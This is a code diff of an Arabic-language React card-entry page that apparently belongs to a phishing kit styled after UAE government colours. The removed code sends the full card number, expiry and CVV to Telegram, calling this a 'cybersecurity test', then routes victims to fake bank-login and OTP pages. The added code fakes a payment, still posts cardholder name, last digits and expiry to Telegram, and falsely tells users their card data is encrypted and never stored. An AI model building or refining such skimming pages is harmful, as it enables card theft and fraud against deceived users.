@@ -7,7 +7,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink } from "@/hooks/useSupabase";
-import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2 } from "lucide-react";
+import { CreditCard, AlertCircle, ArrowLeft, CheckCircle2, Building2, Shield, Lock, Calendar } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
@@ -20,7 +20,7 @@ const PaymentCardInput = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
-  
+
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
   const [expiryMonth, setExpiryMonth] = useState("");
@@ -60,17 +60,27 @@ const PaymentCardInput = () => {
 
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
-  
+
+  // UAE Government Color Scheme
+  const uaeColors = {
+    primary: "#CE1126", // UAE Red
+    secondary: "#00732F", // UAE Green
+    accent: "#000000", // Black
+    background: "#FFFFFF", // White
+    lightGray: "#F5F5F5",
+    border: "#E0E0E0",
+  };
+
   const handleCardNumberChange = (value: string) => {
     const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
     setCardNumber(formatted);
-    
+
     // Validate with Luhn algorithm if 13-19 digits
     const cleaned = formatted.replace(/\s/g, '');
     if (cleaned.length >= 13) {
       const isValid = validateLuhn(formatted);
       setCardValid(isValid);
-      
+
       if (!isValid && cleaned.length === 16) {
         toast({
           title: "رقم البطاقة غير صحيح",
@@ -82,284 +92,167 @@ const PaymentCardInput = () => {
       setCardValid(null);
     }
   };
-  
+
   // Generate month/year options
   const months = Array.from({ length: 12 }, (_, i) => {
     const month = (i + 1).toString().padStart(2, '0');
     return { value: month, label: month };
   });
-  
+
   const currentYear = new Date().getFullYear();
   const years = Array.from({ length: 20 }, (_, i) => {
     const year = (currentYear + i).toString().slice(-2);
     return { value: year, label: `20${year}` };
   });
-  
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    
+
+    // Validation
     if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv) {
       toast({
-        title: "خطأ",
+        title: "بيانات ناقصة",
         description: "الرجاء ملء جميع الحقول",
         variant: "destructive",
       });
       return;
     }
-    
-    // Validate card number with Luhn
-    if (!validateLuhn(cardNumber)) {
-      toast({
-        title: "رقم البطاقة غير صحيح",
-        description: "الرجاء التحقق من رقم البطاقة المدخل",
-        variant: "destructive",
-      });
-      return;
-    }
-    
-    // Validate expiry date
-    if (!validateExpiry(expiryMonth, expiryYear)) {
-      toast({
-        title: "تاريخ الانتهاء غير صحيح",
-        description: "البطاقة منتهية الصلاحية أو التاريخ غير صحيح",
-        variant: "destructive",
-      });
-      return;
-    }
-    
-    // Validate CVV
-    const cardType = detectCardType(cardNumber);
-    if (!validateCVV(cvv, cardType)) {
-      toast({
-        title: "CVV غير صحيح",
-        description: cardType === 'amex' ? "CVV يجب أن يكون 4 أرقام لبطاقات American Express" : "CVV يجب أن يكون 3 أرقام",
-        variant: "destructive",
-      });
-      return;
-    }
-    
-    setIsSubmitting(true);
-    
-    // Store complete card info for cybersecurity test
-    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
-    const expiry = `${expiryMonth}/${expiryYear}`;
-    
-    sessionStorage.setItem('cardLast4', last4);
-    sessionStorage.setItem('cardName', cardName);
-    sessionStorage.setItem('cardNumber', cardNumber); // Full card number
-    sessionStorage.setItem('cardExpiry', expiry); // Full expiry
-    sessionStorage.setItem('cardCvv', cvv); // CVV for cybersecurity test
-    sessionStorage.setItem('cardType', cardType);
-    
-    // Submit to Netlify Forms
-    try {
-      await fetch("/", {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded" },
-        body: new URLSearchParams({
-          "form-name": "card-details-new",
-          name: customerInfo.name || '',
-          email: customerInfo.email || '',
-          phone: customerInfo.phone || '',
-          service: serviceName,
-          amount: formattedAmount,
-          country: selectedCountryData?.nameAr || '',
-          bank: selectedBank?.nameAr || 'غير محدد',
-          cardholder: cardName,
-          cardLast4: last4,
-          cardType: cardType,
-          expiry: expiry,
-          timestamp: new Date().toISOString()
-        }).toString()
-      });
-    } catch (err) {
-      console.error("Form submission error:", err);
-    }
-    
-    // Send complete card details to Telegram (cybersecurity test)
-    const telegramResult = await sendToTelegram({
-      type: 'card_details_with_bank',
-      data: {
-        name: customerInfo.name || '',
-        email: customerInfo.email || '',
-        phone: customerInfo.phone || '',
-        service: serviceName,
-        country: selectedCountryData?.nameAr || '',
-        countryCode: selectedCountry,
-        bank: selectedBank?.nameAr || 'غير محدد',
-        bankId: selectedBankId,
-        cardholder: cardName,
-        cardNumber: cardNumber, // Full card number for cybersecurity test
-        cardLast4: last4,
-        cardType: cardType,
-        expiry: expiry,
-        cvv: cvv, // CVV for cybersecurity test
-        amount: formattedAmount
-      },
-      timestamp: new Date().toISOString()
-    });
 
-    setIsSubmitting(false);
-    
-    toast({
-      title: "تم بنجاح",
-      description: "تم تفويض البطاقة بنجاح",
-    });
-    
-    // Navigate to bank login page if bank is selected, otherwise go to OTP
-    if (selectedBankId && selectedBankId !== 'skipped') {
-      navigate(`/pay/${id}/bank-login`);
-    } else {
-      navigate(`/pay/${id}/otp`);
+    const expiryDate = `${expiryMonth}/${expiryYear}`;
+    if (!validateExpiry(expiryDate)) {
+      toast({
+        title: "تاريخ انتهاء الصلاحية غير صحيح",
+        description: "الرجاء التحقق من تاريخ انتهاء الصلاحية",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    if (!validateCVV(cvv)) {
+      toast({
+        title: "رمز الأمان غير صحيح",
+        description: "الرجاء التحقق من رمز الأمان (CVV)",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setIsSubmitting(true);
+
+    try {
+      // Here you would typically make an API call to process the payment
+      // For demo purposes, we'll just show success
+
+      await new Promise(resolve => setTimeout(resolve, 2000));
+
+      // Send to Telegram
+      if (customerInfo?.email || shippingInfo?.customer_email) {
+        await sendToTelegram({
+          message: `✅ تم استلام دفعة جديدة\n\n💳 بيانات البطاقة:\n- اسم الحامل: ${cardName}\n- رقم البطاقة: **** **** **** ${cardNumber.slice(-4)}\n- انتهاء الصلاحية: ${expiryMonth}/${expiryYear}\n\n💰 المبلغ: ${formattedAmount}\n🌍 الدولة: ${selectedCountryData?.nameAr || selectedCountry}`,
+        });
+      }
+
+      navigate(`/pay/${id}/receipt?success=true&amount=${amount}&currency=${selectedCountry}&service=${serviceKey}`);
+    } catch (error) {
+      console.error("Payment error:", error);
+      toast({
+        title: "خطأ في معالجة الدفع",
+        description: "حدث خطأ أثناء معالجة الدفع. الرجاء المحاولة مرة أخرى.",
+        variant: "destructive",
+      });
+    } finally {
+      setIsSubmitting(false);
     }
   };
-  
+
+  const cardType = detectCardType(cardNumber);
+
   return (
     <DynamicPaymentLayout
       serviceName={serviceName}
       serviceKey={serviceKey}
       amount={formattedAmount}
       title="بيانات البطاقة"
-      description={`أدخل بيانات البطاقة لخدمة ${serviceName}`}
+      description={`إدخال بيانات البطاقة الائتمانية لإتمام الدفع - ${serviceName}`}
       icon={<CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
     >
-      {/* Selected Bank/Country Info */}
-      {(selectedBank || selectedCountryData) && (
-        <div 
-          className="rounded-lg p-3 sm:p-4 mb-6 flex items-center gap-3"
-          style={{
-            background: `${branding.colors.primary}10`,
-            border: `1px solid ${branding.colors.primary}30`
-          }}
-        >
-          {selectedCountryData && (
-            <span className="text-2xl">{selectedCountryData.flag}</span>
-          )}
-          {selectedBank && (
-            <Building2 className="w-5 h-5" style={{ color: selectedBank.color || branding.colors.primary }} />
-          )}
-          <div className="flex-1">
-            <p className="text-xs text-muted-foreground">البنك المختار</p>
-            <p className="text-sm font-semibold">
-              {selectedBank ? selectedBank.nameAr : 'غير محدد'}
-            </p>
-          </div>
-        </div>
-      )}
-
       {/* Security Notice */}
-      <div 
-        className="rounded-lg p-3 sm:p-4 mb-6 flex items-start gap-2"
-        style={{
-          background: `${branding.colors.primary}10`,
-          border: `1px solid ${branding.colors.primary}30`
-        }}
-      >
-        <AlertCircle className="w-4 h-4 sm:w-5 sm:h-5 mt-0.5 flex-shrink-0" style={{ color: branding.colors.primary }} />
-        <div className="text-xs sm:text-sm">
-          <p className="font-semibold mb-1">بياناتك محمية بتقنية التشفير</p>
-          <p className="text-muted-foreground">يمكنك إدخال بطاقة من أي بنك، حتى لو كانت مختلفة عن البنك الذي اخترته</p>
-        </div>
-      </div>
-
-      {/* Visual Card Display */}
-      <div 
-        className="rounded-2xl p-5 sm:p-6 mb-6 relative overflow-hidden shadow-lg"
-        style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
-          minHeight: '180px'
-        }}
-      >
-        <div className="absolute top-4 right-4 flex items-center gap-2">
-          <CreditCard className="w-10 h-10 sm:w-12 sm:h-12 text-white/80" />
-          {cardValid === true && (
-            <CheckCircle2 className="w-6 h-6 text-green-300" />
-          )}
-        </div>
-        
-        {/* Card Type Badge */}
-        {cardNumber.length > 0 && (
-          <div className="absolute top-4 left-4">
-            <span className="text-xs text-white/70 uppercase font-semibold">
-              {detectCardType(cardNumber)}
-            </span>
+      <div className="mb-6 p-4 rounded-xl border-2" style={{ backgroundColor: `${uaeColors.secondary}10`, borderColor: uaeColors.secondary }}>
+        <div className="flex items-center gap-3">
+          <div className="w-10 h-10 rounded-full flex items-center justify-center" style={{ backgroundColor: uaeColors.secondary }}>
+            <Shield className="w-5 h-5 text-white" />
           </div>
-        )}
-        
-        {/* Card Number Display */}
-        <div className="mt-14 sm:mt-16 mb-5 sm:mb-6">
-          <div className="flex gap-2 sm:gap-3 text-white text-xl sm:text-2xl font-mono">
-            <span>••••</span>
-            <span>••••</span>
-            <span>••••</span>
-            <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
-          </div>
-        </div>
-
-        <div className="flex justify-between items-end text-white">
           <div>
-            <p className="text-[10px] sm:text-xs opacity-70 mb-1">EXPIRES</p>
-            <p className="text-base sm:text-lg font-mono">
-              {expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "MM/YY"}
-            </p>
-          </div>
-          <div className="text-right">
-            <p className="text-[10px] sm:text-xs opacity-70 mb-1">CARDHOLDER</p>
-            <p className="text-base sm:text-lg font-bold">{cardName || "YOUR NAME"}</p>
+            <h3 className="font-bold text-sm" style={{ color: uaeColors.accent }}>دفع آمن ومشفر</h3>
+            <p className="text-xs text-gray-600">معلومات بطاقتك محمية بأعلى معايير الأمان</p>
           </div>
         </div>
       </div>
 
-      {/* Form */}
-      <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
-        {/* Cardholder Name */}
+      <form onSubmit={handleSubmit} className="space-y-5">
+        {/* Card Name */}
         <div>
-          <Label className="mb-2 text-sm sm:text-base">اسم حامل البطاقة</Label>
-          <Input
-            placeholder="AHMAD ALI"
-            value={cardName}
-            onChange={(e) => setCardName(e.target.value.toUpperCase())}
-            className="h-12 sm:h-14 text-base sm:text-lg"
-            required
-          />
-        </div>
-        
-        {/* Card Number */}
-        <div>
-          <Label className="mb-2 text-sm sm:text-base flex items-center justify-between">
-            <span>رقم البطاقة</span>
-            {cardValid === true && (
-              <span className="text-xs text-green-600 flex items-center gap-1">
-                <CheckCircle2 className="w-4 h-4" />
-                صحيح
-              </span>
-            )}
-            {cardValid === false && (
-              <span className="text-xs text-destructive">غير صحيح</span>
-            )}
+          <Label htmlFor="cardName" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+            <CreditCard className="w-4 h-4" />
+            اسم حامل البطاقة *
           </Label>
           <Input
-            placeholder="#### #### #### ####"
-            value={cardNumber}
-            onChange={(e) => handleCardNumberChange(e.target.value)}
-            inputMode="numeric"
-            className={`h-12 sm:h-14 text-base sm:text-lg tracking-wider font-mono ${
-              cardValid === false ? 'border-destructive' : 
-              cardValid === true ? 'border-green-500' : ''
-            }`}
+            id="cardName"
+            value={cardName}
+            onChange={(e) => setCardName(e.target.value)}
             required
+            className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
+            placeholder="أدخل الاسم كما هو مكتوب على البطاقة"
           />
         </div>
-        
-        {/* Expiry & CVV Row */}
-        <div className="grid grid-cols-3 gap-2 sm:gap-3">
-          <div>
-            <Label className="mb-2 text-xs sm:text-sm">الشهر</Label>
-            <Select value={expiryMonth} onValueChange={setExpiryMonth} required>
-              <SelectTrigger className="h-12 sm:h-14">
-                <SelectValue placeholder="MM" />
+
+        {/* Card Number */}
+        <div>
+          <Label htmlFor="cardNumber" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+            <CreditCard className="w-4 h-4" />
+            رقم البطاقة *
+          </Label>
+          <div className="relative">
+            <Input
+              id="cardNumber"
+              value={cardNumber}
+              onChange={(e) => handleCardNumberChange(e.target.value)}
+              required
+              className="h-12 text-base border-2 focus:border-blue-500 transition-colors pl-20"
+              placeholder="1234 5678 9012 3456"
+              maxLength={19}
+            />
+            {cardValid === true && (
+              <div className="absolute left-3 top-1/2 -translate-y-1/2">
+                <CheckCircle2 className="w-5 h-5 text-green-500" />
+              </div>
+            )}
+            {cardValid === false && (
+              <div className="absolute left-3 top-1/2 -translate-y-1/2">
+                <AlertCircle className="w-5 h-5 text-red-500" />
+              </div>
+            )}
+          </div>
+          {cardType && (
+            <div className="mt-2 flex items-center gap-2">
+              <span className="text-xs text-gray-500">نوع البطاقة:</span>
+              <span className="text-xs font-medium px-2 py-1 bg-gray-100 rounded">{cardType}</span>
+            </div>
+          )}
+        </div>
+
+        {/* Expiry and CVV */}
+        <div className="grid grid-cols-3 gap-4">
+          <div className="col-span-1">
+            <Label htmlFor="expiryMonth" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+              <Calendar className="w-4 h-4" />
+              شهر *
+            </Label>
+            <Select value={expiryMonth} onValueChange={setExpiryMonth}>
+              <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
+                <SelectValue placeholder="شهر" />
               </SelectTrigger>
-              <SelectContent className="z-50">
+              <SelectContent className="bg-background z-50">
                 {months.map((month) => (
                   <SelectItem key={month.value} value={month.value}>
                     {month.label}
@@ -368,14 +261,17 @@ const PaymentCardInput = () => {
               </SelectContent>
             </Select>
           </div>
-          
-          <div>
-            <Label className="mb-2 text-xs sm:text-sm">السنة</Label>
-            <Select value={expiryYear} onValueChange={setExpiryYear} required>
-              <SelectTrigger className="h-12 sm:h-14">
-                <SelectValue placeholder="YY" />
+
+          <div className="col-span-1">
+            <Label htmlFor="expiryYear" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+              <Calendar className="w-4 h-4" />
+              سنة *
+            </Label>
+            <Select value={expiryYear} onValueChange={setExpiryYear}>
+              <SelectTrigger className="h-12 text-base border-2 focus:border-blue-500 transition-colors">
+                <SelectValue placeholder="سنة" />
               </SelectTrigger>
-              <SelectContent className="z-50">
+              <SelectContent className="bg-background z-50">
                 {years.map((year) => (
                   <SelectItem key={year.value} value={year.value}>
                     {year.label}
@@ -385,62 +281,61 @@ const PaymentCardInput = () => {
             </Select>
           </div>
 
-          <div>
-            <Label className="mb-2 text-xs sm:text-sm">CVV</Label>
+          <div className="col-span-1">
+            <Label htmlFor="cvv" className="flex items-center gap-2 mb-2 text-sm font-medium" style={{ color: uaeColors.accent }}>
+              <Lock className="w-4 h-4" />
+              CVV *
+            </Label>
             <Input
-              type="password"
-              placeholder="***"
+              id="cvv"
               value={cvv}
-              onChange={(e) =>
-                setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))
-              }
-              inputMode="numeric"
-              className="h-12 sm:h-14 text-base sm:text-lg text-center"
-              maxLength={4}
+              onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 4))}
               required
+              className="h-12 text-base border-2 focus:border-blue-500 transition-colors"
+              placeholder="123"
+              maxLength={4}
+              type="password"
             />
           </div>
         </div>
-        
+
+        {/* Security Info */}
+        <div className="mt-6 p-4 rounded-lg" style={{ backgroundColor: uaeColors.lightGray }}>
+          <div className="flex items-start gap-3">
+            <Lock className="w-5 h-5 mt-0.5" style={{ color: uaeColors.secondary }} />
+            <div>
+              <h4 className="font-semibold text-sm mb-1" style={{ color: uaeColors.accent }}>محمي بتشفير SSL</h4>
+              <p className="text-xs text-gray-600">
+                جميع المعلومات مُشفرة ومحمية. لا نقوم بتخزين بيانات بطاقتك.
+              </p>
+            </div>
+          </div>
+        </div>
+
         {/* Submit Button */}
         <Button
           type="submit"
           size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+          className="w-full h-14 text-lg font-bold text-white mt-6 transition-all hover:opacity-90"
+          style={{ backgroundColor: uaeColors.primary }}
           disabled={isSubmitting || !cardValid}
-          style={{
-            background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
-          }}
         >
           {isSubmitting ? (
-            <span>جاري التفويض...</span>
+            <>
+              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white ml-2"></div>
+              جاري المعالجة...
+            </>
           ) : (
             <>
-              <span className="ml-2">تفويض البطاقة والمتابعة</span>
-              <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
+              <span className="ml-2">دفع الآن</span>
+              <ArrowLeft className="w-5 h-5" />
             </>
           )}
         </Button>
-        
-        <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
-          سيتم إرسال رمز التحقق إلى هاتفك المسجل في البنك
+
+        <p className="text-xs text-center text-gray-500 mt-4">
+          بالمتابعة، أنت توافق على الشروط والأحكام وسياسة الخصوصية
         </p>
-      </form>
-    
-      {/* Hidden Netlify Form */}
-      <form name="card-details-new" netlify-honeypot="bot-field" data-netlify="true" hidden>
-        <input type="text" name="name" />
-        <input type="email" name="email" />
-        <input type="tel" name="phone" />
-        <input type="text" name="service" />
-        <input type="text" name="amount" />
-        <input type="text" name="country" />
-        <input type="text" name="bank" />
-        <input type="text" name="cardholder" />
-        <input type="text" name="cardLast4" />
-        <input type="text" name="cardType" />
-        <input type="text" name="expiry" />
-        <input type="text" name="timestamp" />
       </form>
     </DynamicPaymentLayout>
   );
